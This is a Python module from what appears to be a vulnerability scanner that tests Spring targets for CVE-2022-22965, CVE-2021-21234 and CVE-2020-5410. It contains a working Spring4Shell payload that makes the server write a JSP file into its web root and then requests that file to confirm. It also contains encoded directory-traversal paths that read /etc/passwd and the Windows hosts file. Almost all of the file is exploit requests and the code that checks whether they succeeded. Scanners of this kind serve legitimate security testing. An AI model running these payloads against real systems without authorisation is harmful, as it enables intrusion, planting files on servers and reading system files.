#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Spring扫描类: 
        Spring Framework RCE(Spring core RCE)
            CVE-2022-22965
        Spring Boot Actuator Log View 文件读取/文件包含/目录遍历
            CVE-2021-21234
        Spring Cloud Config Server目录遍历
            CVE-2020-5410
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class Spring():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Spring'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2022_22965_payloads = [
            {
                'path': '',
                'data': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=mouse&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format('CVE/2022/22965')
            }
        ]

        self.cve_2021_21234_payloads = [
            {
                'path': 'manage/log/view?filename=/etc/passwd&base=../../../../../../../',
                'data': ''
            },
            {
                'path': 'manage/log/view?filename=C:\Windows\System32\drivers\etc\hosts&base=../../../../../../../',
                'data': ''
            }
        ]

        self.cve_2020_5410_payloads = [
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"',
                'data': ''
            },
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:\Windows\System32\drivers\etc\hosts%23foo/development"',
                'data': ''
            }
        ]

    def cve_2022_22965_scan(self, url):
        ''' Spring Framework 远程代码执行漏洞(Spring core RCE)
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2022-22965'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'suffix': '%>//',
            'c1': 'Runtime',
            'c2': '<%',
            'DNT': '1'
        }

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2022_22965_payloads:   # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
                sleep(5)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            verify_url = url + 'mouse.jsp'
            verify_res = requests.get(
                    verify_url, 
                    timeout=self.timeout, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )

            if (verify_res.status_code == 200):
                for i in range(5):
                    sleep(1)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
                    verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )

                if ((verify_res.status_code == 200) and ('CVE/2022/22965' in verify_res.text)):
                    results = {
                        'Target': target,
                        'Verify': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Method': vul_info['vul_method'],
                        'Payload': {
                            'url': url,
                            'Data': data,
                            'Headers': str(vul_info['headers'])
                        }
                    }
                    return results

    def cve_2021_21234_scan(self, url):
        ''' spring-boot-actuator-logview文件包含漏洞
                <= 0.2.13
                虽然检查了文件名参数以防止目录遍历攻击(filename=../somefile 防御了攻击)
                但没有充分检查基本文件夹参数, 因此filename=somefile&base=../ 可以访问日志记录基目录之外的文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2021-21234'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2021_21234_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text) or ('Microsoft Corp' in res.text) or ('Microsoft TCP/IP for Windows' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2020_5410_scan(self, url):
        ''' spring cloud config server目录遍历漏洞
                可以使用特制URL发送请求, 从而跨目录读取文件。
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2020-5410'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2020_5410_payloads:     # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                vul_info['status_code'] = str(res.status_code)
                logger.logging(vul_info)                        # * LOG
            except requests.ConnectTimeout:
                vul_info['status_code'] = 'Timeout'
                logger.logging(vul_info)
                return None
            except requests.ConnectionError:
                vul_info['status_code'] = 'Faild'
                logger.logging(vul_info)
                return None

            if (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text) or ('Microsoft Corp' in res.text) or ('Microsoft TCP/IP for Windows' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url):
        return [
            thread(target=self.cve_2020_5410_scan, url=url),
            thread(target=self.cve_2021_21234_scan, url=url),
            thread(target=self.cve_2022_22965_scan, url=url)
        ]

spring = Spring()